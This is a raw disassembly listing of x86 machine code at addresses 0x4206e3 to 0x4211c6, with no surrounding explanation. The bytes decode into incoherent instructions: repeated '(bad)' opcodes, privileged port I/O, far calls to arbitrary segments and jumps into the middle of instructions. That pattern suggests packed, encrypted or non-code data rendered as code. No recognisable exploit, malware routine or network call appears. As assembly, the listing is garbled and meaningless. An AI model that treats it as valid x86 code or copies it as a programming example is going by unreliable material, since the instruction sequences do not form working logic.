  4206e3:	bound  edx,QWORD PTR [esi+0x35]
  4206e6:	div    BYTE PTR [esi+eiz*1]
  4206e9:	movntps XMMWORD PTR ds:0x14c477b9,xmm0
  4206f0:	inc    esp
  4206f1:	(bad)  
  4206f2:	lods   al,BYTE PTR ds:[esi]
  4206f3:	pushf  
  4206f4:	mov    WORD PTR [ebx-0x5d],cs
  4206f7:	nop
  4206f8:	addr16 adc eax,0x163e82ee
  4206fe:	call   0xaf1d:0x53df766b
  420705:	cmp    DWORD PTR [edi+eax*8+0x609085f1],0x24
  42070d:	and    ebx,edi
  42070f:	mov    esi,0x7cc15532
  420714:	xchg   esi,eax
  420715:	icebp  
  420716:	inc    esi
  420717:	cmp    bh,BYTE PTR [esi+0x71]
  42071a:	and    BYTE PTR [ebp-0x55],bl
  42071d:	fisttp WORD PTR ds:0x5f8fc4d7
  420723:	add    BYTE PTR [esi-0x4e],bh
  420726:	aas    
  420727:	into   
  420728:	mov    cl,BYTE PTR [eax+0x465d60fe]
  42072e:	or     dl,BYTE PTR [esi+0x2a18d850]
  420734:	fild   WORD PTR [esi-0x673078c8]
  42073a:	cmp    edi,DWORD PTR [ecx]
  42073c:	mov    esp,0xfa906c7e
  420741:	sbb    dl,dh
  420743:	out    dx,al
  420744:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420745:	add    al,0xb9
  420747:	outs   dx,BYTE PTR ds:[esi]
  420748:	adc    al,0x61
  42074a:	cmp    DWORD PTR [ebx-0xa],ebp
  42074d:	push   ds
  42074e:	xchg   BYTE PTR [esi+0x2cd60017],ch
  420754:	mov    DWORD PTR [eax-0x27e0a875],ebp
  42075a:	sahf   
  42075b:	hlt    
  42075c:	data16 loope 0x420706
  42075f:	or     BYTE PTR [ebx+0x799b1938],0xde
  420766:	push   cs
  420767:	popf   
  420768:	pop    ebx
  420769:	pand   mm0,QWORD PTR fs:[edx+ebx*4+0x1b]
  42076f:	xor    ebp,DWORD PTR [eax-0x40]
  420772:	arpl   WORD PTR [ecx+edx*8],di
  420775:	jae    0x4207d0
  420777:	js     0x420706
  420779:	neg    ecx
  42077b:	and    DWORD PTR [edi-0x53],eax
  42077e:	mov    dh,BYTE PTR [ecx+0x4f]
  420781:	in     al,dx
  420782:	outs   dx,BYTE PTR ds:[esi]
  420783:	dec    esp
  420784:	fsub   QWORD PTR [eax]
  420786:	lods   eax,DWORD PTR ds:[esi]
  420787:	dec    edx
  420788:	mov    eax,0xf15f429d
  42078d:	pop    ebx
  42078e:	jnp    0x420799
  420790:	jmp    0x42073b
  420792:	gs aaa 
  420794:	sbb    DWORD PTR [eax-0xb],eax
  420797:	outs   dx,DWORD PTR ds:[esi]
  420798:	js     0x4207cc
  42079a:	mov    al,BYTE PTR [edx-0x3069780e]
  4207a0:	in     eax,0x15
  4207a2:	aam    0x14
  4207a4:	leave  
  4207a5:	push   esi
  4207a6:	ss mov al,0x94
  4207a9:	(bad)  [edx]
  4207ab:	mov    eax,es:0x171fed4d
  4207b1:	cwde   
  4207b2:	int3   
  4207b3:	sub    BYTE PTR [edi-0x35],0x65
  4207b7:	stos   DWORD PTR es:[edi],eax
  4207b8:	fdivr  QWORD PTR [eax]
  4207ba:	push   ecx
  4207bb:	mov    ecx,0x3582724
  4207c0:	fs pop esi
	...
  420832:	add    BYTE PTR [eax],al
  420834:	mov    eax,ds:0x3b920b9a
  420839:	xchg   ebx,eax
  42083a:	mov    ecx,0xafa823bb
  42083f:	mov    bh,0xb2
  420841:	enter  0x80ce,0xb4
  420845:	pop    esp
  420846:	add    DWORD PTR [eax],eax
  420848:	test   BYTE PTR [eax],0x0
  42084b:	add    BYTE PTR [edx+0x3d051053],ch
  420851:	adc    DWORD PTR [esp+eiz*4+0x24],ebp
  420855:	add    eax,0x9b3b6a34
  42085a:	psubq  mm7,mm6
  42085d:	(bad)
  420860:	aam    0x4c
  420862:	adc    al,0x55
  420864:	ins    BYTE PTR es:[edi],dx
  420865:	pop    esp
  420866:	inc    edi
  420867:	ss xchg ebp,eax
  420869:	stc    
  42086a:	xor    al,dh
  42086c:	adc    eax,0x54c04a38
  420871:	jl     0x420873
  420873:	jb     0x4208d9
  420875:	cs lahf 
  420877:	jl     0x4207fa
  420879:	pusha  
  42087a:	call   0x367370eb
  42087f:	mov    ah,0xd1
  420881:	fild   QWORD PTR [ecx+0x42]
  420884:	aad    0xc4
  420886:	cmp    cl,cl
  420888:	stc    
  420889:	push   es
  42088a:	mov    cl,0x75
  42088c:	pop    ds
  42088d:	jg     0x4208e2
  42088f:	scas   al,BYTE PTR es:[edi]
  420890:	ds xchg esi,eax
  420892:	(bad)  
  420893:	ds push ebp
  420895:	push   esi
  420896:	loop   0x42082f
  420898:	xchg   edx,eax
  420899:	mov    al,0x5
  42089b:	sbb    dl,BYTE PTR [edi+0x73c390ca]
  4208a1:	jge    0x4208d2
  4208a3:	sbb    edx,DWORD PTR [edx]
  4208a5:	xchg   ebx,eax
  4208a6:	lahf   
  4208a7:	or     eax,0x7dda5611
  4208ac:	ficom  WORD PTR [ecx]
  4208ae:	mov    eax,ds:0x395966a9
  4208b3:	daa    
  4208b4:	xchg   ecx,eax
  4208b5:	pushf  
  4208b6:	sbb    dh,ch
  4208b8:	loop   0x42092b
  4208ba:	ret    0x81ee
  4208bd:	jb     0x4208e5
  4208bf:	jno    0x4208c9
  4208c1:	add    al,0x5e
  4208c3:	sub    eax,0x45f6b63b
  4208c8:	call   0x2ddaffc7
  4208cd:	mov    ah,0xf3
  4208cf:	les    ebp,FWORD PTR ds:0x16396462
  4208d5:	mov    esi,0x2cc3c71b
  4208da:	xor    edx,edx
  4208dc:	imul   eax,DWORD PTR [ebx-0x4a49cf9c],0x34
  4208e3:	rep stos DWORD PTR es:[edi],eax
  4208e5:	xlat   BYTE PTR ds:[ebx]
  4208e6:	pop    ebp
  4208e7:	and    BYTE PTR [esi+0x312af624],ah
  4208ed:	icebp  
  4208ee:	jb     0x420955
  4208f0:	jo     0x42087b
  4208f2:	outs   dx,DWORD PTR ds:[esi]
  4208f3:	push   cs
  4208f4:	push   edi
  4208f5:	adc    esi,DWORD PTR [edi+0x41]
  4208f8:	jne    0x420924
  4208fa:	push   edi
  4208fb:	data16 sbb BYTE PTR [ebp+0x35],0x18
  420900:	in     al,dx
  420901:	(bad)  
  420902:	cli    
  420903:	popf   
  420904:	jo     0x4208a3
  420906:	sar    DWORD PTR [edi+ebx*4],0xe3
  42090a:	sub    edi,DWORD PTR [edi+eiz*4-0x39417793]
  420911:	cli    
  420912:	test   BYTE PTR [edx+0x6e],ah
  420915:	aaa    
  420916:	mov    bh,0xe1
  420918:	dec    eax
  420919:	cmc    
  42091a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42091b:	test   bl,bh
  42091d:	jle    0x420947
  42091f:	adc    bl,bl
  420921:	fisttp QWORD PTR [edx+0x610de999]
  420927:	je     0x42091a
  420929:	in     al,0x79
  42092b:	xor    DWORD PTR [esi+0x6834b72d],0xa3c1f4ea
  420935:	cmp    eax,ecx
  420937:	cmp    edx,DWORD PTR [edx-0x7]
  42093a:	xor    BYTE PTR [ecx],bh
  42093c:	stc    
  42093d:	sbb    al,0x6b
  42093f:	mov    BYTE PTR [eax+ecx*8+0x0],dl
	...
  4209b3:	add    BYTE PTR [edx],cl
  4209b5:	inc    ecx
  4209b6:	mov    bh,0xa1
  4209b8:	push   edi
  4209ba:	push   ds
  4209bb:	jmp    0x42097d
  4209bd:	sahf   
  4209be:	fisub  WORD PTR [esi-0x52]
  4209c1:	call   0x1:0x5daa27ee
  4209c8:	test   BYTE PTR [eax],0x0
  4209cb:	add    BYTE PTR [edx+ebp*2+0x2e050c4],dh
  4209d2:	into   
  4209d3:	repz mov al,0x3b
  4209d6:	sbb    al,0x30
  4209d8:	cmp    dl,al
  4209da:	inc    ebp
  4209db:	jnp    0x420a39
  4209dd:	ins    DWORD PTR es:[edi],dx
  4209de:	sbb    DWORD PTR [ecx],edx
  4209e0:	jb     0x420a47
  4209e2:	and    eax,0x7ab38d48
  4209e7:	inc    ecx
  4209e8:	add    bl,al
  4209ea:	fwait
  4209eb:	adc    bl,BYTE PTR ds:0x590e8026
  4209f1:	mov    ecx,0xe4ced694
  4209f6:	shr    DWORD PTR [eax],0x9a
  4209f9:	mov    eax,0x31db51bc
  4209fe:	loop   0x420a5a
  420a00:	out    0x8,eax
  420a02:	std    
  420a03:	or     eax,edx
  420a05:	stc    
  420a06:	sub    ah,BYTE PTR [edi+0x55]
  420a09:	push   edx
  420a0a:	mov    eax,ds:0x5ffca3b3
  420a0f:	outs   dx,BYTE PTR ds:[esi]
  420a10:	xchg   esi,eax
  420a11:	pop    ebp
  420a12:	aam    0xe4
  420a14:	(bad)  
  420a15:	outs   dx,DWORD PTR ds:[esi]
  420a16:	test   bh,al
  420a18:	dec    ebp
  420a19:	out    0xfa,al
  420a1b:	scas   eax,DWORD PTR es:[edi]
  420a1c:	cmp    DWORD PTR [edi-0x7c],0x4f
  420a20:	lea    ebp,[eax]
  420a22:	fadd   QWORD PTR [edi]
  420a24:	inc    edi
  420a25:	inc    esp
  420a26:	arpl   WORD PTR [ecx],dx
  420a28:	pushf  
  420a29:	and    ch,ah
  420a2b:	icebp  
  420a2c:	push   0x64b45e56
  420a31:	pop    eax
  420a32:	test   eax,0x39076b92
  420a37:	adc    BYTE PTR ss:[ecx],dl
  420a3a:	jnp    0x420a61
  420a3c:	jmp    0x4209be
  420a3e:	add    bl,BYTE PTR [edx+0x7fc26e70]
  420a44:	push   ebx
  420a45:	std    
  420a46:	dec    edi
  420a47:	stc    
  420a48:	xor    al,0xb5
  420a4a:	lock in eax,dx
  420a4c:	cmp    al,0xea
  420a4e:	lock mov ds:0x287e8198,al
  420a54:	jecxz  0x420a1a
  420a56:	mov    esp,0x2bd36ac8
  420a5b:	imul   ebx,DWORD PTR [eax],0x51
  420a5e:	(bad)  
  420a5f:	cld    
  420a60:	inc    esp
  420a61:	call   0x711fbfb0
  420a66:	in     al,dx
  420a67:	sub    bh,BYTE PTR [eax]
  420a69:	sub    ch,0x40
  420a6c:	push   edi
  420a6d:	bound  ebp,QWORD PTR [ebx]
  420a6f:	js     0x4209f8
  420a71:	push   ecx
  420a72:	sub    DWORD PTR [edx+0x2f],0x68da0254
  420a79:	pop    esp
  420a7a:	jne    0x420ad4
  420a7c:	mov    eax,0x2548a6a5
  420a81:	jne    0x420a7e
  420a83:	aam    0x23
  420a85:	add    cl,BYTE PTR [edx-0x52]
  420a88:	mov    dh,0x22
  420a8a:	jae    0x420a99
  420a8c:	(bad)  
  420a8e:	nop
  420a8f:	adc    BYTE PTR [ecx+esi*4],ah
  420a92:	push   0x67
  420a94:	add    eax,0xcacaec5
  420a99:	jbe    0x420aa0
  420a9b:	aas    
  420a9c:	push   eax
  420a9d:	js     0x420af7
  420a9f:	mov    bl,0x3f
  420aa1:	fisub  DWORD PTR [edi+0x59]
  420aa4:	mov    al,0xb6
  420aa6:	pop    ebp
  420aa7:	or     BYTE PTR [edx+edi*4],bh
  420aaa:	addr16 test eax,0x41cbc2c5
  420ab0:	(bad)  
  420ab1:	push   cs
  420ab2:	xchg   DWORD PTR [ecx],esi
  420ab4:	shl    cl,0x5d
  420ab7:	xor    DWORD PTR [esi],eax
  420ab9:	adc    bh,BYTE PTR [edx+0x46]
  420abc:	inc    edi
  420abd:	call   DWORD PTR [eax+ebx*4+0x28]
  420ac1:	test   BYTE PTR [eax],0x0
	...
  420b34:	fsubr  QWORD PTR [eax]
  420b36:	mov    ah,ah
  420b38:	(bad)  
  420b39:	out    0xfe,al
  420b3b:	cmp    BYTE PTR [edi+0x39],dl
  420b3e:	dec    edx
  420b3f:	subps  xmm2,XMMWORD PTR [ebx-0x24]
  420b43:	adc    esp,DWORD PTR [eax-0x9fffea2]
  420b49:	add    BYTE PTR [eax],al
  420b4b:	add    BYTE PTR [edi-0x35],cl
  420b4e:	(bad)  [edx]
  420b50:	sbb    DWORD PTR [ecx-0x1c],ebx
  420b53:	mov    dl,0xe4
  420b55:	fsub   QWORD PTR [edx+0x6b]
  420b58:	push   es
  420b59:	jge    0x420bc7
  420b5b:	xor    BYTE PTR [eax],0x65
  420b5e:	ins    DWORD PTR es:[edi],dx
  420b5f:	add    al,0xc5
  420b61:	stc    
  420b62:	jb     0x420b57
  420b64:	fucomip st,st(0)
  420b66:	jmp    0x420b96
  420b68:	stc    
  420b69:	push   cs
  420b6a:	push   cs
  420b6b:	xchg   edi,eax
  420b6c:	mov    ds:0xb336e118,eax
  420b71:	jns    0x420b14
  420b73:	mov    edi,0x8fa8edfa
  420b78:	push   ebp
  420b79:	sub    dl,bl
  420b7b:	add    ebp,DWORD PTR [edi-0x6d]
  420b7e:	sbb    DWORD PTR [ecx+0x37cb8d6d],0xffffff9d
  420b85:	imul   edi,edx,0xffffffde
  420b88:	mov    al,0xb3
  420b8a:	push   0xffffffa3
  420b8c:	add    ebp,DWORD PTR [eax-0x5f]
  420b8f:	psrlw  mm6,QWORD PTR [ecx+0x7e]
  420b93:	retf   
  420b94:	call   0x1648:0xb7103925
  420b9b:	cmp    al,0xa9
  420b9d:	dec    esi
  420b9e:	xchg   ecx,eax
  420b9f:	mov    edx,0xb6b0920d
  420ba4:	pop    ebx
  420ba5:	cwde   
  420ba6:	scas   eax,DWORD PTR es:[edi]
  420ba7:	mov    esi,0xdd80c15d
  420bac:	out    dx,al
  420bad:	sbb    cl,dl
  420baf:	mov    edi,0x6f52ff64
  420bb4:	mov    ds:0xbd44de00,al
  420bb9:	push   ebx
  420bba:	sbb    eax,0x44ea0681
  420bbf:	xchg   edi,eax
  420bc0:	(bad)  
  420bc1:	rcr    DWORD PTR [ebp+0x325d3733],0x95
  420bc8:	outs   dx,BYTE PTR ds:[esi]
  420bc9:	add    bl,BYTE PTR [ebp-0x36ff57cd]
  420bcf:	jg     0x420c31
  420bd1:	mov    al,dl
  420bd3:	rcr    bh,1
  420bd5:	test   BYTE PTR [edx],ch
  420bd7:	sbb    ah,BYTE PTR [edx]
  420bd9:	cmc    
  420bda:	add    eax,0xac7fc277
  420bdf:	gs out dx,al
  420be1:	cmp    eax,0xa50a190a
  420be6:	mov    BYTE PTR [ecx+0x23b1860f],ah
  420bec:	sub    DWORD PTR [edi],ebx
  420bee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420bef:	in     al,0xe6
  420bf1:	push   ebp
  420bf2:	fist   DWORD PTR [edx]
  420bf4:	cli    
  420bf5:	icebp  
  420bf6:	mov    ds:0x82151276,al
  420bfb:	cdq    
  420bfc:	pusha  
  420bfd:	jmp    FWORD PTR [ecx+0x390c286a]
  420c03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c04:	add    al,al
  420c06:	mov    ebx,0xddab6987
  420c0b:	push   ecx
  420c0c:	daa    
  420c0d:	test   al,0xfc
  420c0f:	cmp    DWORD PTR [eax],edi
  420c11:	leave  
  420c12:	das    
  420c13:	and    al,BYTE PTR [ebx]
  420c15:	mov    cl,0x2
  420c17:	sub    BYTE PTR [edx],cl
  420c19:	pop    eax
  420c1a:	sar    ebp,0x23
  420c1d:	jmp    0xa5ce:0x9fd5bef4
  420c24:	mov    ds:0xe1c46aa6,al
  420c29:	call   0xd1ef5ca
  420c2e:	cmp    eax,0x4d8effc2
  420c33:	nop
  420c34:	(bad)  
  420c35:	retf   0x3da3
  420c38:	in     eax,dx
  420c39:	mov    al,BYTE PTR [edx+0x74]
  420c3c:	and    ebp,DWORD PTR [eax+0x5]
  420c3f:	stc    
  420c40:	sti    
  420c41:	add    BYTE PTR [bx+si],al
	...
  420cb4:	or     al,0x6a
  420cb6:	push   edx
  420cb7:	shl    DWORD PTR [esi-0x7],0x9f
  420cbb:	out    dx,eax
  420cbc:	xchg   ecx,eax
  420cbd:	inc    ecx
  420cbe:	push   0x5ef4955f
  420cc3:	fs xchg esi,eax
  420cc5:	pop    edi
  420cc6:	add    DWORD PTR [eax],eax
  420cc8:	test   BYTE PTR [eax],0x0
  420ccb:	add    BYTE PTR [ebp+0xc75ba4d],cl
  420cd1:	daa    
  420cd2:	sub    BYTE PTR [ecx],0xd1
  420cd5:	jmp    DWORD PTR [edi]
  420cd7:	mov    WORD PTR [edi-0x63],ds
  420cda:	mov    ds:0xb9de766c,eax
  420cdf:	mov    ch,0xd1
  420ce1:	ror    DWORD PTR [edi+edx*2+0xb],0x2
  420ce6:	ds jbe 0x420d63
  420ce9:	and    edx,eax
  420ceb:	sbb    al,0xf
  420ced:	or     cl,ch
  420cef:	in     al,dx
  420cf0:	push   edx
  420cf1:	inc    esp
  420cf2:	fld    DWORD PTR ds:0xff2efd84
  420cf8:	cld    
  420cf9:	or     al,BYTE PTR ds:0x9628e32d
  420cff:	and    ebx,DWORD PTR [ebp+0x2e13c3c6]
  420d05:	mov    ds:0x49f5aa7,eax
  420d0a:	les    ebx,FWORD PTR [esi+0x56]
  420d0d:	xchg   ebp,eax
  420d0e:	mov    ds:0xf071a238,al
  420d13:	gs je  0x420d80
  420d16:	gs dec esi
  420d18:	dec    edx
  420d19:	mov    WORD PTR ds:0x4b07d19d,ds
  420d1f:	gs and bh,BYTE PTR ss:[edx+0x16]
  420d24:	or     dh,dh
  420d26:	mov    al,ds:0x403ad3c3
  420d2b:	jge    0x420d7c
  420d2d:	aas    
  420d2e:	inc    esp
  420d2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d30:	mov    eax,ds:0x7b8dfeae
  420d35:	mov    al,0xc9
  420d37:	sbb    ch,dh
  420d39:	std    
  420d3a:	xchg   ecx,eax
  420d3b:	xchg   esp,eax
  420d3c:	enter  0xc9e0,0x56
  420d40:	shl    dl,0x5a
  420d43:	hlt    
  420d44:	enter  0x41b6,0xff
  420d48:	mov    ds:0x21b3272d,eax
  420d4d:	jnp    0x420d43
  420d4f:	loope  0x420d0a
  420d51:	mov    dh,0x5c
  420d53:	xor    BYTE PTR [ebx],al
  420d55:	sub    eax,eax
  420d57:	inc    edx
  420d58:	jle    0x420ce3
  420d5a:	mov    WORD PTR [edx-0x7fc3d5ec],gs
  420d60:	cmp    BYTE PTR ds:[edi+eax*4],ch
  420d64:	jl     0x420cf0
  420d66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d68:	outs   dx,DWORD PTR ds:[esi]
  420d69:	(bad)  
  420d6a:	lods   al,BYTE PTR ds:[esi]
  420d6b:	and    al,0x1a
  420d6d:	ffreep st(2)
  420d6f:	or     eax,0x4fec598e
  420d74:	push   0x5428ca30
  420d79:	xor    ch,dl
  420d7b:	pop    ebp
  420d7c:	and    ah,al
  420d7e:	daa    
  420d7f:	dec    ebp
  420d80:	daa    
  420d81:	lods   eax,DWORD PTR ds:[esi]
  420d82:	out    dx,eax
  420d83:	fstp   TBYTE PTR [ecx-0x6880cb71]
  420d89:	(bad)  
  420d8a:	sti    
  420d8b:	or     ebx,DWORD PTR [edi-0x43]
  420d8e:	mov    ecx,0x56b3596d
  420d93:	in     al,dx
  420d94:	test   eax,0x72e5e0bb
  420d99:	cmp    eax,0xde97dca8
  420d9e:	aaa    
  420d9f:	sbb    ebx,DWORD PTR [edi-0x79b8c03f]
  420da5:	rcl    BYTE PTR [eax-0x36],cl
  420da8:	inc    ebx
  420da9:	add    DWORD PTR [edx-0x4e],ecx
  420dac:	shr    BYTE PTR [edi-0x5a78ca6a],1
  420db2:	xor    al,0x3a
  420db4:	(bad)  gs:[ebx]
  420db7:	adc    eax,0x51e2b30d
  420dbc:	push   ecx
  420dbd:	adc    ebx,ebp
  420dbf:	dec    eax
  420dc0:	pop    eax
  420dc1:	xchg   ecx,eax
	...
  420e32:	add    BYTE PTR [eax],al
  420e34:	stos   BYTE PTR es:[edi],al
  420e35:	push   ebp
  420e36:	call   0x645d:0xffefffe7
  420e3d:	inc    ebx
  420e3e:	and    edx,ecx
  420e40:	pcmpeqd mm1,QWORD PTR [edx]
  420e43:	inc    edi
  420e44:	mov    WORD PTR [eax+0x1],fs
  420e47:	add    dh,dh
  420e49:	add    BYTE PTR [eax],al
  420e4b:	add    BYTE PTR [esp+edi*8],dh
  420e4e:	in     al,dx
  420e4f:	mov    esi,0x7d1c585
  420e54:	mov    eax,ds:0xd12a5d3e
  420e59:	inc    ebp
  420e5a:	loope  0x420e53
  420e5c:	pop    edx
  420e5d:	mov    esp,0x7b9911fe
  420e62:	out    0x9e,al
  420e64:	aas    
  420e65:	xchg   ebp,eax
  420e66:	stos   BYTE PTR es:[edi],al
  420e67:	sub    BYTE PTR [edx+0x44],0xea
  420e6b:	fcom   QWORD PTR [ecx-0x1d75c3cc]
  420e72:	dec    ebp
  420e73:	and    ebp,DWORD PTR [eax+ebp*2-0x18cd9a4c]
  420e7a:	ins    BYTE PTR es:[edi],dx
  420e7b:	sar    WORD PTR ss:[edi],0xfe
  420e80:	jle    0x420e31
  420e82:	shl    DWORD PTR [ebx-0x1d541139],0x88
  420e89:	fidivr DWORD PTR ds:0x13adf620
  420e8f:	dec    ebx
  420e90:	imul   edi,ebx,0xc7e9a320
  420e96:	xchg   ecx,eax
  420e97:	pop    esi
  420e98:	lds    edx,FWORD PTR [ebx]
  420e9a:	es lahf 
  420e9c:	pop    es
  420e9d:	(bad)  
  420e9e:	cmp    BYTE PTR [edi],cl
  420ea0:	(bad)  
  420ea1:	arpl   ax,bx
  420ea3:	aaa    
  420ea4:	pop    edx
  420ea5:	fsub   DWORD PTR [eax+0x54]
  420ea8:	lock cmp al,0x8
  420eab:	jp     0x420e97
  420ead:	or     BYTE PTR [ebp+0x2b58aed7],ch
  420eb3:	pusha  
  420eb4:	add    al,BYTE PTR [eax-0x29]
  420eb7:	in     al,0x43
  420eb9:	in     al,dx
  420eba:	mov    eax,0xad22df61
  420ebf:	(bad)  
  420ec0:	sub    cl,BYTE PTR [esi+0x31fd90d6]
  420ec6:	std    
  420ec7:	mov    al,0x1a
  420ec9:	xor    DWORD PTR [edx+0x51],eax
  420ecc:	fiadd  DWORD PTR [ebx+0x37]
  420ecf:	shl    BYTE PTR [edi+edi*1-0x7bdbbd44],cl
  420ed6:	icebp  
  420ed7:	jle    0x420e75
  420ed9:	inc    ecx
  420eda:	imul   ebx,DWORD PTR [eax],0x5e027595
  420ee0:	into   
  420ee1:	or     cl,BYTE PTR [esi-0x30ac0bc0]
  420ee7:	ret    
  420ee8:	mov    al,0x6c
  420eea:	xchg   esi,eax
  420eeb:	lods   eax,DWORD PTR ds:[esi]
  420eec:	xor    eax,0x8a2cb844
  420ef2:	je     0x420ee9
  420ef4:	push   ecx
  420ef5:	xchg   esp,eax
  420ef6:	xor    eax,DWORD PTR [ecx+0x11]
  420ef9:	aaa    
  420efa:	es jmp 0xd7dc4fdb
  420f00:	inc    esp
  420f01:	mov    eax,ds:0x584c889c
  420f06:	push   edx
  420f07:	pop    ecx
  420f08:	stos   BYTE PTR es:[edi],al
  420f09:	mov    esp,0x6567e297
  420f0e:	adc    dl,BYTE PTR [ecx+0x1d]
  420f11:	hlt    
  420f12:	mov    BYTE PTR [edx],al
  420f14:	loope  0x420ec9
  420f16:	jmp    0x6dbbb067
  420f1b:	sbb    edi,DWORD PTR [edx+ecx*2+0x2ba062a0]
  420f22:	mov    ebx,0x85cb8ad4
  420f27:	jae    0x420f63
  420f29:	outs   dx,BYTE PTR ds:[esi]
  420f2a:	(bad)  
  420f2b:	fdivp  st(1),st
  420f2d:	push   edx
  420f2e:	pop    esi
  420f2f:	push   cs
  420f30:	jge    0x420eb9
  420f32:	inc    ebx
  420f33:	int    0xdd
  420f35:	sub    eax,0x6b659e6
  420f3a:	sti    
  420f3b:	addr16 push esi
  420f3d:	into   
  420f3e:	mov    ds:0xb1ec61,al
	...
  420fb3:	add    BYTE PTR [edx-0x5b],ah
  420fb6:	jbe    0x421037
  420fb8:	idiv   edi
  420fba:	imul   edi,DWORD PTR [ebp-0x6d53d0f4],0xffffffea
  420fc1:	dec    esp
  420fc2:	(bad)  
  420fc3:	mov    BYTE PTR [edx-0x9fffe9f],0x0
  420fca:	add    BYTE PTR [eax],al
  420fcc:	jae    0x420f99
  420fce:	out    0x7a,al
  420fd0:	xchg   esp,eax
  420fd1:	test   eax,0x3510df9f
  420fd6:	mov    WORD PTR [esi+0x26d2d7e9],ss
  420fdc:	icebp  
  420fdd:	and    BYTE PTR [edx+esi*2],ah
  420fe0:	fwait
  420fe1:	paddusb mm3,mm1
  420fe4:	outs   dx,BYTE PTR ds:[esi]
  420fe5:	push   cs
  420fe6:	fld    DWORD PTR fs:[eax-0x68]
  420fea:	xor    eax,0x5fcf12eb
  420fef:	sbb    esi,DWORD PTR [edx+0x26df6feb]
  420ff5:	sbb    eax,0x570a950d
  420ffa:	call   0xf163:0xf634db8c
  421001:	outs   dx,DWORD PTR ds:[esi]
  421002:	ds cmp al,bh
  421005:	pop    eax
  421006:	ins    BYTE PTR es:[edi],dx
  421007:	es and edi,eax
  42100a:	xchg   esi,eax
  42100b:	loop   0x421049
  42100d:	fld    QWORD PTR [ebx+0x17924bc3]
  421013:	arpl   WORD PTR [esi+0x61a81092],di
  421019:	out    0x9a,eax
  42101b:	repnz clc 
  42101d:	(bad)  
  42101e:	cli    
  42101f:	rcr    DWORD PTR [edx+0x66],1
  421022:	fisubr WORD PTR [eax]
  421024:	or     eax,0x32b79591
  421029:	ror    ah,1
  42102b:	jbe    0x421000
  42102d:	lods   eax,DWORD PTR ds:[esi]
  42102e:	mov    ebx,0xfdb526fa
  421033:	push   0xf516ef53
  421038:	dec    ebp
  421039:	sub    al,bl
  42103b:	jmp    0x421065
  42103d:	loope  0x4210b3
  42103f:	and    esp,ebx
  421041:	jecxz  0x421053
  421043:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421044:	add    esp,esi
  421046:	mov    ah,0x39
  421048:	jne    0x4210b1
  42104a:	test   eax,0xfb480472
  42104f:	xor    DWORD PTR [edi+0xa],ebx
  421052:	dec    esp
  421053:	lods   eax,DWORD PTR ds:[esi]
  421054:	jecxz  0x42100b
  421056:	push   esi
  421057:	rcl    BYTE PTR cs:[ecx-0x7b8f9e06],1
  42105e:	pop    ecx
  42105f:	(bad)
  421062:	push   0xbcf6365e
  421067:	imul   ebx,DWORD PTR [eax-0x5a],0x4c
  42106b:	fbstp  TBYTE PTR [edx+0x3]
  42106e:	hlt    
  42106f:	xchg   edi,eax
  421070:	aaa    
  421071:	jmp    0x6f13e887
  421076:	xchg   esi,eax
  421077:	fwait
  421078:	test   BYTE PTR [esi-0x3e],dl
  42107b:	add    eax,0xf8ea848b
  421080:	jg     0x42108a
  421082:	stos   DWORD PTR es:[edi],eax
  421083:	cmp    al,BYTE PTR [esi+ebp*8+0x744360ce]
  42108a:	push   0xc822aa60
  42108f:	out    dx,al
  421090:	fisubr WORD PTR [edx-0x43]
  421093:	out    dx,al
  421094:	mov    ch,0x1f
  421096:	addr16 sub al,0xd7
  421099:	or     ebx,DWORD PTR [ebp+0x40]
  42109c:	imul   ebp,DWORD PTR [edi-0xb7cce23],0xffffff92
  4210a3:	out    dx,al
  4210a4:	xor    cl,BYTE PTR [ebp-0x76]
  4210a7:	shl    DWORD PTR [ebp+0x75846c88],1
  4210ad:	(bad)  
  4210ae:	aas    
  4210af:	lock sub dh,bh
  4210b2:	pop    ebx
  4210b3:	pop    esi
  4210b4:	dec    edi
  4210b5:	push   esi
  4210b6:	xor    DWORD PTR [edx+0x6445c134],ebx
  4210bc:	cmp    eax,0x2f45936b
  4210c1:	out    dx,al
	...
  421132:	add    BYTE PTR [eax],al
  421134:	jae    0x421105
  421136:	fwait
  421137:	cmp    DWORD PTR [edi+0x15cff37d],edi
  42113d:	dec    edi
  42113e:	data16 jg 0x4210f8
  421141:	and    edx,eax
  421143:	xchg   esp,eax
  421144:	js     0x4211a8
  421146:	add    DWORD PTR [eax],eax
  421148:	test   BYTE PTR [eax],0x0
  42114b:	add    bl,bh
  42114d:	outs   dx,BYTE PTR ds:[esi]
  42114e:	mov    dl,0xf
  421150:	sub    BYTE PTR [ebx],ch
  421152:	fwait
  421153:	in     al,0x1a
  421155:	xchg   edi,eax
  421156:	or     edx,DWORD PTR [esp+ebx*2+0x18]
  42115a:	mul    DWORD PTR [eax]
  42115c:	(bad)  
  42115d:	mov    ch,0xa5
  42115f:	cli    
  421160:	jae    0x4211b9
  421162:	inc    edi
  421163:	stos   BYTE PTR es:[edi],al
  421164:	or     bh,BYTE PTR [ecx]
  421166:	xlat   BYTE PTR ds:[ebx]
  421167:	jns    0x4211ba
  421169:	mov    WORD PTR [esi+0x3bcb2926],cs
  42116f:	mov    ebx,0x5294f939
  421174:	(bad)
  421177:	in     al,dx
  421178:	pushf  
  421179:	into   
  42117a:	lds    esi,FWORD PTR [ebp+0x2b320a87]
  421180:	fld    QWORD PTR [eax-0x7916e14a]
  421186:	and    al,0xcc
  421188:	bound  edi,QWORD PTR [eax+0x40a71c83]
  42118e:	mov    ss,WORD PTR ds:0x724a0f0b
  421194:	inc    ebp
  421195:	dec    esp
  421196:	test   al,0x4
  421198:	repnz sub eax,0x22c329c2
  42119e:	aam    0xf3
  4211a0:	out    dx,al
  4211a1:	xchg   BYTE PTR [edx-0x2ce715d3],dh
  4211a7:	jbe    0x4211ce
  4211a9:	in     eax,dx
  4211aa:	mov    ah,0xe4
  4211ac:	test   al,0x97
  4211ae:	mov    ebp,0x61bfa6f9
  4211b3:	pop    ds
  4211b4:	es mov ch,0xc4
  4211b7:	cs data16 ja 0x4211b8
  4211bb:	hlt    
  4211bc:	jecxz  0x4211da
  4211be:	jno    0x42115f
  4211c0:	cmp    DWORD PTR [edx+0x75c81038],esp
  4211c6:	sar    eax,cl
